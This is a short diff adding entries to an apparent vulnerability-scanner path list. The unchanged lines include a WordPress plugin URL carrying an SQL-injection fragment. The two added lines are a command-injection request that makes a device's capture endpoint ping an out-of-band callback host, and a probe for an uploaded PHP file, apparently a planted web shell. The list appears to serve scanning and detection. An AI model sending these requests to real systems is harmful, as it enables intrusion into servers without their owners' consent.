@@ -60,3 +60,5 @@
 /wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type=&e
 /{{route}}
 /wp-content/plugins/email-subscribers/readme.txt
+/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
+/wp-content/uploads/isnapshots/{{fname}}.php
